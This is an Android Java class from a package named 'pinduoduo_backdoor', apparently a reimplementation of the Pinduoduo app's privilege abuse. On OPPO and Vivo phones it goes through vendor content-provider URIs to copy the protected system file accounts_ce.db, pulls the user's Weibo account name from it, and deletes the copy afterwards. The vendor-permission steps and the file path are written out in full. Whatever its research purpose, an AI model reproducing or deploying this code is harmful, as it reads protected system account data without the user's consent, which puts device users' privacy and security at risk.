package com.tech.pinduoduo_backdoor.idCollectors;

import static android.content.Context.MODE_PRIVATE;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.Build;
import android.text.TextUtils;

import com.tech.pinduoduo_backdoor.FileProviderV2;
import com.tech.pinduoduo_backdoor.GlobalInfo;
import com.tech.pinduoduo_backdoor.Logger;
import com.tech.pinduoduo_backdoor.RomOsUtil;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

public class WeiboNameCollector {

    public WeiboNameCollector() {
    }

    public String collectInfo() {
        String info = "";
        BrandInfo brandInfo = null;
        if (RomOsUtil.isOppoManufacture()) {
            if (Build.VERSION.SDK_INT <= 28 && Build.VERSION.SDK_INT >= 26) {
                brandInfo = new BrandInfo("provider_oppo_settings", "content://com.android.settings.files/clear_share");
            }
            if (Build.VERSION.SDK_INT == 29) { //Android 10
                brandInfo = new BrandInfo("provider_oppo_au", "content://com.coloros.phonemanager.files/clear_share");
            }
        } else if (RomOsUtil.isVivoManufacture()) {
            brandInfo = new BrandInfo("VIVO_PM_UPDATE_V2", "content://com.vivo.assistant.upgrade");
        }
        if (brandInfo == null) {
            Logger.debug("brandInfo == null");
            return "brandInfo is empty";
        }

        if (!hasPermission(brandInfo.getScene())) {
            Logger.debug(String.format("no scene(%s) perm", brandInfo.getScene()));
            requestPermissionAfter90(brandInfo.getScene());
            return "grant permission. try again.";
        } else {
            String realCollectInfo = realCollectInfo(brandInfo.getTargetUri());
            if (TextUtils.isEmpty(realCollectInfo) || TextUtils.equals("微博", realCollectInfo)) {
                Logger.debug("name is empty.");
                return "name is empty.";
            }
            Logger.debug("get name success.");
            return realCollectInfo;
        }
    }

    public boolean hasPermission(String scene) {
        SharedPreferences sh = GlobalInfo.context.getSharedPreferences("MySharedPref", MODE_PRIVATE);
        return sh.getBoolean(scene, false);
    }

    private String realCollectInfo(String str) {
        try {
            String dbFilePath = FileProviderV2.instance().fileProviderUtils().openDB(Uri.parse(str + "/data/system_ce/0/accounts_ce.db"));
            if (dbFilePath == null) {
                Logger.debug("LVUA.Dynamic.IdCollectAbility.WbName cannot get db handle.");
                return "";
            }
            SQLiteDatabase database = SQLiteDatabase.openDatabase(dbFilePath, null, 0);
            if (database == null) {
                Logger.debug("database == null");
            }
            String nameFromDb = getNameFromDb(database);
            if (database != null) {
                database.close();
            }
            File fdelete = new File(dbFilePath);
            if (fdelete.exists()) {
                fdelete.delete();
            }
            return nameFromDb;
        } catch (Throwable th) {
            Logger.debug("LVUA.Dynamic.IdCollectAbility.WbName: " + th);
        }
        return "";
    }


    private String getNameFromDb(SQLiteDatabase sQLiteDatabase) {
        Cursor cursor = null;
        try {
            try {
                cursor = sQLiteDatabase.query("accounts", null, "type = ?", new String[]{"com.sina.weibo.account"}, null, null, null);
                if (cursor == null || !cursor.moveToFirst()) {
                    if (cursor != null) {
                        cursor.close();
                        return "";
                    }
                    return "";
                }
                @SuppressLint("Range") String string = cursor.getString(cursor.getColumnIndex("name"));
                if (cursor != null) {
                    cursor.close();
                }
                return string;
            } catch (Exception e) {
                Logger.debug("LVUA.Dynamic.IdCollectAbility.WbName" + " get name from db failed");
                if (cursor != null) {
                    cursor.close();
                    return "";
                }
                return "";
            }
        } catch (Throwable th) {
            if (cursor != null) {
                cursor.close();
            }
            throw th;
        }
    }

    private void requestPermissionAfter90(String scene) {
       boolean result =  FileProviderV2.instance().requestGrantPermission(scene);
       if (result) {
           SharedPreferences sh = GlobalInfo.context.getSharedPreferences("MySharedPref", MODE_PRIVATE);
           SharedPreferences.Editor myEdit = sh.edit();
           myEdit.putBoolean(scene, true);
           myEdit.apply();
       }

    }
}
